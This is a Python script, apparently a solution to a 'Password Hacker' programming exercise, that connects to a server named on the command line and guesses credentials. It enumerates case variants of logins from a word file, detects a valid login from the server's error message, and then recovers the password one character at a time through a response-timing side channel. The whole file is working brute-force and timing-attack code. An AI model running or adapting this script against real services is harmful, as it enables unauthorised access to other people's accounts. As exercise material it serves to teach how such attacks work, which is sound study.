import sys
import json
import os
from socket import socket
from datetime import datetime
from string import ascii_letters, digits
from itertools import product


class PasswordHacker:

    def __init__(self):
        self.address = (sys.argv[1], int(sys.argv[2]))
        self.logins = self._generate_logins()
        self.login = ''
        self.login_found = False
        self.passwords = self._generate_passwords()
        self.password = ''
        self.temporary_password_char = ''
        self.password_prefix = ''
        self.request = None
        self.response = None
        self.socket = None

    def _generate_logins(self):
        file = 'logins.txt'
        path = 'C:\\Users\\vladn\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking'
        logins_file = os.path.join(path, file)
        with open(logins_file) as file:
            logins = file.read().split()
            for login in logins:
                variants = product(*zip(login.lower(), login.upper()))
                for variant in variants:
                    yield ''.join(variant)

    def _generate_passwords(self):
        yield from ascii_letters + digits

    def _generate_request(self):
        if not self.login_found:
            self.login = next(self.logins)
        else:
            self.temporary_password_char = next(self.passwords)
        self.password = self.password_prefix + self.temporary_password_char
        self.request = {"login": self.login, "password": self.password}

    def _send_data(self):
        self.request = json.dumps(self.request).encode()
        self.socket.send(self.request)

    def _get_response(self):
        data = self.socket.recv(4096)
        response = json.loads(data)
        self.response = response["result"]

    def guess_credentials(self):
        with socket() as self.socket:
            self.socket.connect(self.address)
            while self.response != "Connection success!":
                self._generate_request()
                self._send_data()
                start = datetime.now()
                self._get_response()
                delay = datetime.now() - start
                if self.response == "Wrong password!":
                    self.login_found = True
                if delay.total_seconds() >= 0.1:
                    self.password_prefix += self.temporary_password_char
                    self.passwords = self._generate_passwords()
            else:
                print(self.request.decode())


if __name__ == '__main__':
    hacker = PasswordHacker()
    hacker.guess_credentials()
